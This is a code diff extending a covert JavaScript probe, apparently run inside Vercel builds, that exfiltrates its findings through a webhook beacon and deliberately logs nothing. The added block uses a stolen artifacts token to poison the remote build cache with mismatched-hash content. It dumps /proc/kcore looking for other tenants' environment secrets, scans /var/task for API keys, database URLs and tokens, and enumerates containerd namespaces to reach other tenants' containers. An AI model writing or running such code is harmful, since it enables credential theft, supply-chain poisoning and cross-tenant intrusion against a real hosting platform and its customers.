@@ -4186,6 +4186,145 @@ report.internalNetworkEnum = safe(() => {
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v45";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v45" });
 
+// ===== v49: artifact hash mismatch, /proc/kcore cross-VM, seccomp, var/task secrets, containerd ns =====
+
+// v49-1: Artifact cache poisoning — upload content with MISMATCHED hash, verify fake content served
+report.artifactHashMismatch = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_ORG_ID || '';
+  if (!token) return { err: 'NO_TOKEN' };
+
+  // Generate a fake hash that doesn't match the content "PROBE-V49-POISON"
+  // Real hash of "PROBE-V49-POISON" would be sha256(...). We use a different fake hash.
+  const fakeHash = 'probe49' + 'a'.repeat(57); // 64 hex chars
+  const poisonContent = 'PROBE-V49-POISON-BUILD-CACHE-' + Date.now();
+
+  // Step 1: Upload with mismatched hash
+  safe(() => writeFileSync('/tmp/poison49.bin', poisonContent));
+  const uploadResult = safe(() =>
+    execSync(
+      `curl -s --max-time 8 -X PUT "https://vercel.com/api/remote-cache/v8/artifacts/${fakeHash}?teamId=${teamId}" ` +
+      `-H "Authorization: Bearer ${token}" ` +
+      `-H "Content-Type: application/octet-stream" ` +
+      `--data-binary @/tmp/poison49.bin 2>&1 | head -5`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 200)
+  );
+
+  // Step 2: Download the same hash — does server return our content (no hash validation)?
+  const downloadResult = safe(() =>
+    execSync(
+      `curl -s --max-time 8 "https://vercel.com/api/remote-cache/v8/artifacts/${fakeHash}?teamId=${teamId}" ` +
+      `-H "Authorization: Bearer ${token}" 2>&1 | head -5`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 300)
+  );
+
+  // Step 3: Check if download returned our poison content
+  const contentMatch = (downloadResult || '').includes('PROBE-V49-POISON');
+  return { fakeHash, uploadResult, downloadResult, contentMatch };
+});
+
+// v49-2: /proc/kcore physical memory — read physical RAM via CAP_SYS_RAWIO (cross-VM data exposure)
+report.kcorePhysicalMem = safe(() => {
+  const kcoreExists = existsSync('/proc/kcore');
+  const kcoreSize = safe(() => statSync('/proc/kcore').size);
+  if (!kcoreExists) return { kcoreExists: false };
+
+  // /proc/kcore is in ELF core format. Read first 64 bytes to check ELF header.
+  const elfHeader = safe(() => {
+    try {
+      const fd = openSync('/proc/kcore', 'r');
+      const buf = Buffer.alloc(64);
+      const n = readSync(fd, buf, 0, 64, 0);
+      closeSync(fd);
+      return buf.slice(0, n).toString('hex');
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+
+  // Try dd to read physical memory at offset 0 (first physical page)
+  const physPage0 = safe(() =>
+    execSync('dd if=/proc/kcore bs=512 skip=0 count=1 2>/dev/null | strings | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+
+  // Try to find other VMs' env vars in physical memory — look for VERCEL_PROJECT_ID patterns
+  // at various offsets (other VMs' physical pages are in the same kcore)
+  const crossVmSearch = safe(() =>
+    execSync(
+      'dd if=/proc/kcore bs=4096 count=1024 skip=256 2>/dev/null | strings | grep -E "VERCEL_PROJECT_ID|VERCEL_ENV_ENC_KEY|VERCEL_OIDC|prj_" | head -20',
+      { timeout: 20000 }
+    ).toString().trim().slice(0, 600)
+  );
+
+  return { kcoreExists, kcoreSize, elfHeader, physPage0, crossVmSearch };
+});
+
+// v49-3: Seccomp profile — what syscalls are blocked? Can we bypass with CAP_SYS_ADMIN?
+report.seccompProfile = safe(() => {
+  const selfStatus = safe(() => readFileSync('/proc/self/status', 'utf8')
+    .split('\n').filter(l => /Seccomp|CapEff|CapPrm|CapBnd/i.test(l)).join('\n')
+  );
+  const pid1Status = safe(() => readFileSync('/proc/1/status', 'utf8')
+    .split('\n').filter(l => /Seccomp|CapEff|CapPrm|CapBnd/i.test(l)).join('\n')
+  );
+  // seccomp mode: 0=disabled, 1=strict, 2=filter
+  const seccompMode = safe(() => {
+    const m = (readFileSync('/proc/self/status', 'utf8').match(/Seccomp:\s*(\d)/) || [])[1];
+    return m ? { mode: parseInt(m), meaning: ['disabled','strict','filter'][parseInt(m)] || 'unknown' } : null;
+  });
+  // Try to load a seccomp filter with a harmless syscall (requires CAP_SYS_ADMIN or prctl without no_new_privs)
+  const prstatus = safe(() =>
+    execSync('cat /proc/self/status | grep -i "seccomp\\|NoNewPrivs\\|CapEff"', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  return { selfStatus, pid1Status, seccompMode, prstatus };
+});
+
+// v49-4: /var/task comprehensive secret scan — find connection strings, API keys, hardcoded secrets
+report.varTaskSecretScan = safe(() => {
+  const patterns = [
+    { name: 'jwt_secret', rx: 'jwt_secret|JWT_SECRET|signing_key|SIGNING_KEY' },
+    { name: 'hmac_key',   rx: 'hmac_key|HMAC_KEY|hmacSecret|cache_secret|CACHE_SECRET' },
+    { name: 'db_url',     rx: 'postgresql://|mysql://|mongodb://|redis://' },
+    { name: 'api_key',    rx: 'api_key\\s*=|apiKey\\s*=|API_KEY\\s*=' },
+    { name: 'aws_secret', rx: 'aws_secret_access_key|AWS_SECRET_ACCESS_KEY' },
+    { name: 'github_pat', rx: 'ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|github_token' },
+    { name: 'slack',      rx: 'xoxb-|xoxp-|xoxa-' },
+    { name: 'stripe',     rx: 'sk_live_|sk_test_|rk_live_' },
+    { name: 'sendgrid',   rx: 'SG\\.[a-zA-Z0-9]{22}' },
+  ];
+  const results = {};
+  for (const p of patterns) {
+    results[p.name] = safe(() =>
+      execSync(
+        `grep -rE "${p.rx}" /var/task/ 2>/dev/null | head -5`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 300) || 'NOT_FOUND'
+    );
+  }
+  return results;
+});
+
+// v49-5: Containerd namespace enumeration — list namespaces to see other tenants' containers
+report.containerdNamespaceList = safe(() => {
+  // crictl config to use containerd.sock
+  const crictlConfig = safe(() => {
+    writeFileSync('/tmp/crictl.yaml', 'runtime-endpoint: unix:///run/containerd/containerd.sock\n');
+    return 'WRITTEN';
+  });
+  const nsList = safe(() =>
+    execSync('crictl -c /tmp/crictl.yaml namespaces 2>&1 | head -20 || echo CRICTL_FAIL', { timeout: 8000 }).toString().trim().slice(0, 400)
+  );
+  // Try ctr (containerd CLI)
+  const ctrNs = safe(() =>
+    execSync('ctr -a /run/containerd/containerd.sock namespaces list 2>&1 | head -20 || echo CTR_FAIL', { timeout: 8000 }).toString().trim().slice(0, 400)
+  );
+  // List containers in k8s.io namespace (where workload containers live)
+  const k8sContainers = safe(() =>
+    execSync('ctr -a /run/containerd/containerd.sock -n k8s.io containers list 2>&1 | head -20 || echo CTR_K8S_FAIL', { timeout: 8000 }).toString().trim().slice(0, 500)
+  );
+  return { crictlConfig, nsList, ctrNs, k8sContainers };
+});
+
 // v46 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v46";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v46" });
@@ -4197,4 +4336,8 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v47" });
 // v48 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v48";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v48" });
+
+// v49 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v49";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v49" });
 // Intentionally no console.log — all data goes via webhook only
